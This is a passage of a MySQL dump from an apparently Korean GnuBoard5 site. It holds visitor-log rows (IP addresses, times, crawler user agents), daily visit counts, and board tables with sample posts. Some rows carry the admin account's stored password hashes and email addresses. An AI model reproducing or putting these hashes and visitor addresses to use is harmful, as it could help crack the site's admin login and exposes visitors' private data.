+http://www.baidu.com/search/spider.html)'),(1411,'180.76.15.25','2015-09-06','19:41:42','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1412,'64.246.165.170','2015-09-06','20:38:38','http://whois.domaintools.com/jubinna.com','Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.13) Gecko/2009073022 Firefox/3.5.2 (.NET CLR 3.5.30729) SurveyBot/2.3 (DomainTools)'),(1413,'180.76.15.149','2015-09-06','20:55:19','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1414,'180.76.15.18','2015-09-06','20:56:33','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1415,'111.248.102.53','2015-09-06','21:25:55','',''),(1416,'180.76.15.142','2015-09-06','21:47:16','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1417,'180.76.15.154','2015-09-06','23:39:12','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1418,'42.86.181.241','2015-09-07','00:07:10','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1419,'119.116.193.31','2015-09-07','00:10:26','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1420,'113.229.200.250','2015-09-07','00:12:00','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1421,'42.202.182.182','2015-09-07','00:13:12','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1422,'111.248.98.8','2015-09-07','00:32:29','',''),(1423,'180.76.15.156','2015-09-07','00:46:45','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1424,'180.76.15.28','2015-09-07','00:47:45','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1425,'207.46.13.180','2015-09-07','01:11:49','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1426,'61.228.89.31','2015-09-07','01:12:56','',''),(1427,'180.76.15.154','2015-09-07','01:47:59','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1428,'180.76.15.32','2015-09-07','01:49:01','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1429,'45.55.33.67','2015-09-07','02:01:39','http://www.netcraft.com/survey/','Mozilla/4.0 (compatible; Netcraft Web Server Survey)'),(1430,'180.76.15.155','2015-09-07','02:59:35','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1431,'180.76.15.148','2015-09-07','03:00:18','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1432,'91.226.212.39','2015-09-07','03:35:49','','Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1'),(1433,'182.118.55.117','2015-09-07','03:45:45','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(1434,'180.76.15.140','2015-09-07','03:51:01','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1435,'180.76.15.31','2015-09-07','03:51:51','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1436,'207.46.13.162','2015-09-07','04:01:17','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1437,'180.76.15.33','2015-09-07','05:45:06','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1438,'180.76.15.5','2015-09-07','06:37:39','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1439,'180.76.15.139','2015-09-07','06:46:00','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1440,'180.76.15.19','2015-09-07','06:46:51','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1441,'182.118.54.17','2015-09-07','07:53:16','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(1442,'180.76.15.10','2015-09-07','08:48:27','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1443,'180.76.15.29','2015-09-07','08:49:31','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1444,'180.76.15.18','2015-09-07','09:55:28','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1445,'180.76.15.157','2015-09-07','09:56:39','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1446,'180.76.15.135','2015-09-07','10:49:35','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1447,'180.76.15.12','2015-09-07','10:50:38','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1448,'180.76.15.137','2015-09-07','11:40:40','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1449,'180.76.15.138','2015-09-07','11:41:19','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1450,'207.46.13.130','2015-09-07','13:06:10','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1451,'207.46.13.166','2015-09-07','13:16:12','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1452,'180.76.15.142','2015-09-07','13:45:58','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1453,'111.248.62.239','2015-09-07','14:14:15','',''),(1454,'36.229.235.89','2015-09-07','14:21:10','',''),(1455,'180.76.15.159','2015-09-07','15:14:31','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1456,'180.76.15.134','2015-09-07','15:53:44','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1457,'180.76.15.27','2015-09-07','17:40:52','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1458,'180.76.15.163','2015-09-07','19:00:11','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1459,'93.174.93.33','2015-09-07','19:23:23','',''),(1460,'180.76.15.13','2015-09-07','19:42:57','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1461,'180.76.15.17','2015-09-07','19:43:44','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1462,'180.76.15.141','2015-09-07','21:50:02','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1463,'180.76.15.147','2015-09-07','22:50:27','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1464,'180.76.15.8','2015-09-07','22:51:34','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1465,'180.76.15.7','2015-09-07','23:40:21','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1466,'180.76.15.30','2015-09-07','23:41:05','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1467,'180.76.15.8','2015-09-08','00:57:01','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1468,'60.23.66.163','2015-09-08','00:57:25','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1469,'180.76.15.5','2015-09-08','00:58:18','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1470,'42.202.166.37','2015-09-08','01:06:18','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1471,'111.248.118.14','2015-09-08','01:09:43','',''),(1472,'207.46.13.162','2015-09-08','01:16:33','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1473,'180.76.15.20','2015-09-08','01:45:10','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1474,'180.76.15.160','2015-09-08','01:46:06','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1475,'111.248.99.47','2015-09-08','03:12:39','',''),(1476,'180.76.15.33','2015-09-08','03:20:31','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1477,'180.76.15.150','2015-09-08','03:21:17','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1478,'180.76.15.6','2015-09-08','04:14:03','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1479,'180.76.15.27','2015-09-08','04:14:49','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1480,'180.76.15.161','2015-09-08','05:15:48','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1481,'180.76.15.32','2015-09-08','05:16:54','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1482,'18.243.0.29','2015-09-08','05:30:14','http://burger-imperia.com/','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36'),(1483,'180.76.15.147','2015-09-08','05:48:57','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1484,'180.76.15.155','2015-09-08','05:49:45','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1485,'46.4.32.75','2015-09-08','05:55:44','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(1486,'180.76.15.144','2015-09-08','06:57:19','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1487,'14.37.188.23','2015-09-08','07:09:15','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36'),(1488,'1.11.144.43','2015-09-08','07:10:09','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36');
/*!40000 ALTER TABLE `g5_visit` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_visit_sum`
--

DROP TABLE IF EXISTS `g5_visit_sum`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_visit_sum` (
  `vs_date` date NOT NULL DEFAULT '0000-00-00',
  `vs_count` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`vs_date`),
  KEY `index1` (`vs_count`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_visit_sum`
--

LOCK TABLES `g5_visit_sum` WRITE;
/*!40000 ALTER TABLE `g5_visit_sum` DISABLE KEYS */;
INSERT INTO `g5_visit_sum` VALUES ('2015-02-11',2),('2015-02-12',11),('2015-02-13',15),('2015-02-15',5),('2015-02-16',9),('2015-02-17',14),('2015-02-18',6),('2015-02-19',4),('2015-02-20',5),('2015-02-21',7),('2015-02-22',4),('2015-03-06',1),('2015-04-08',8),('2015-04-11',2),('2015-04-12',6),('2015-04-18',4),('2015-04-19',12),('2015-04-20',18),('2015-04-21',8),('2015-04-22',5),('2015-04-23',5),('2015-04-24',8),('2015-04-25',21),('2015-04-26',8),('2015-04-27',11),('2015-04-28',6),('2015-04-29',8),('2015-04-30',8),('2015-05-01',9),('2015-05-02',11),('2015-05-03',6),('2015-05-04',10),('2015-05-05',11),('2015-05-06',10),('2015-05-07',11),('2015-05-08',7),('2015-05-09',9),('2015-05-10',9),('2015-05-11',14),('2015-05-12',10),('2015-05-13',7),('2015-05-14',10),('2015-05-15',12),('2015-05-16',10),('2015-05-17',9),('2015-05-18',4),('2015-05-19',11),('2015-05-20',8),('2015-05-21',12),('2015-05-22',18),('2015-05-23',7),('2015-05-24',9),('2015-05-25',10),('2015-05-26',14),('2015-05-27',11),('2015-05-28',5),('2015-05-29',12),('2015-05-30',15),('2015-05-31',9),('2015-06-01',10),('2015-06-02',15),('2015-06-03',10),('2015-06-04',6),('2015-06-10',1),('2015-06-11',16),('2015-06-12',11),('2015-06-13',11),('2015-06-14',10),('2015-06-15',13),('2015-06-16',11),('2015-06-17',12),('2015-06-18',4),('2015-06-19',10),('2015-06-20',7),('2015-06-21',15),('2015-06-22',8),('2015-06-23',15),('2015-06-24',10),('2015-06-25',10),('2015-06-26',6),('2015-06-27',8),('2015-06-28',9),('2015-06-29',10),('2015-06-30',11),('2015-07-01',13),('2015-07-02',9),('2015-07-03',8),('2015-07-04',13),('2015-07-05',9),('2015-07-06',6),('2015-07-07',7),('2015-07-09',1),('2015-07-14',1),('2015-07-23',1),('2015-08-25',6),('2015-08-26',50),('2015-08-27',45),('2015-08-28',50),('2015-08-29',40),('2015-08-30',54),('2015-08-31',48),('2015-09-01',49),('2015-09-02',50),('2015-09-03',49),('2015-09-04',42),('2015-09-05',42),('2015-09-06',44),('2015-09-07',49),('2015-09-08',22);
/*!40000 ALTER TABLE `g5_visit_sum` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_blog`
--

DROP TABLE IF EXISTS `g5_write_blog`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_blog` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_trackback` varchar(255) NOT NULL,
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(255) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL DEFAULT '',
  `wr_twitter_user` varchar(255) NOT NULL DEFAULT '',
  `wr_me2day_user` varchar(255) NOT NULL DEFAULT '',
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_blog`
--

LOCK TABLES `g5_write_blog` WRITE;
/*!40000 ALTER TABLE `g5_write_blog` DISABLE KEYS */;
INSERT INTO `g5_write_blog` VALUES (1,-1,'',1,0,0,'','','','블로그 글1입니다','블로그 글1입니다. 아래에는 적절한 폭의 이미지들을 배치할 수 있습니다. 이미지들은 첨부 화일로 올리면 되며,\r\n여러 개를 출력할 수도 있습니다. 이미지 출력 갯수는 num_of_images 값을 조정하면 됩니다.','','',0,0,'',13,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@localhost.localdomain','','2013-05-25 19:14:14',1,'2013-05-25 19:14:14','127.0.0.1','','','','','','','','','','','','',''),(2,-2,'',2,0,0,'','','','블로그 글2입니다','블로그 글2입니다. 아래에는 적절한 폭의 이미지들을 배치할 수 있습니다. 이미지들은 첨부 화일로 올리면 되며,\r\n여러 개를 출력할 수도 있습니다. 이미지 출력 갯수는 num_of_images 값을 조정하면 됩니다.','','',0,0,'',27,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@domain','','2013-07-17 01:36:08',1,'2013-07-17 01:36:08','127.0.0.1','','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_blog` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_callcenter`
--

DROP TABLE IF EXISTS `g5_write_callcenter`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_callcenter` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL DEFAULT '',
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL DEFAULT '',
  `ca_name` varchar(255) NOT NULL DEFAULT '',
  `wr_option` set('html1','html2','secret','mail') NOT NULL DEFAULT '',
  `wr_subject` varchar(255) NOT NULL DEFAULT '',
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_trackback` varchar(255) NOT NULL DEFAULT '',
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(255) NOT NULL DEFAULT '',
  `wr_password` varchar(255) NOT NULL DEFAULT '',
  `wr_name` varchar(255) NOT NULL DEFAULT '',
  `wr_email` varchar(255) NOT NULL DEFAULT '',
  `wr_homepage` varchar(255) NOT NULL DEFAULT '',
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL DEFAULT '',
  `wr_ip` varchar(255) NOT NULL DEFAULT '',
  `wr_facebook_user` varchar(255) NOT NULL DEFAULT '',
  `wr_twitter_user` varchar(255) NOT NULL DEFAULT '',
  `wr_me2day_user` varchar(255) NOT NULL DEFAULT '',
  `wr_1` varchar(255) NOT NULL DEFAULT '',
  `wr_2` varchar(255) NOT NULL DEFAULT '',
  `wr_3` varchar(255) NOT NULL DEFAULT '',
  `wr_4` varchar(255) NOT NULL DEFAULT '',
  `wr_5` varchar(255) NOT NULL DEFAULT '',
  `wr_6` varchar(255) NOT NULL DEFAULT '',
  `wr_7` varchar(255) NOT NULL DEFAULT '',
  `wr_8` varchar(255) NOT NULL DEFAULT '',
  `wr_9` varchar(255) NOT NULL DEFAULT '',
  `wr_10` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_callcenter`
--

LOCK TABLES `g5_write_callcenter` WRITE;
/*!40000 ALTER TABLE `g5_write_callcenter` DISABLE KEYS */;
INSERT INTO `g5_write_callcenter` VALUES (1,-1,'',1,0,0,'','','html1','콜 센터','이미지에 전화 번호 등을 적어 업로드 하십시요.','','',0,0,'',17,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@localhost.localdomain','','2013-06-09 00:13:00',1,'2013-06-09 00:13:00','127.0.0.1','','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_callcenter` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_event_picture`
--

DROP TABLE IF EXISTS `g5_write_event_picture`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_event_picture` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(20) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL,
  `wr_twitter_user` varchar(255) NOT NULL,
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_event_picture`
--

LOCK TABLES `g5_write_event_picture` WRITE;
/*!40000 ALTER TABLE `g5_write_event_picture` DISABLE KEYS */;
INSERT INTO `g5_write_event_picture` VALUES (3,-1,'',3,0,0,'','','','테스트','....','','',0,0,6,0,0,'admin','*43B6A753E947CC40233137718E1732A086F38386','최고관리자','admin@domain.com','','2015-05-21 20:07:47',1,'2015-05-21 20:07:47','61.102.92.100','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_event_picture` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_event_video`
--

DROP TABLE IF EXISTS `g5_write_event_video`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_event_video` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(20) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL,
  `wr_twitter_user` varchar(255) NOT NULL,
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_event_video`
--

LOCK TABLES `g5_write_event_video` WRITE;
/*!40000 ALTER TABLE `g5_write_event_video` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_write_event_video` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_faq`
--

DROP TABLE IF EXISTS `g5_write_faq`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_faq` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_trackback` varchar(255) NOT NULL,
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(255) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL DEFAULT '',
  `wr_twitter_user` varchar(255) NOT NULL DEFAULT '',
  `wr_me2day_user` varchar(255) NOT NULL DEFAULT '',
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_faq`
--

LOCK TABLES `g5_write_faq` WRITE;
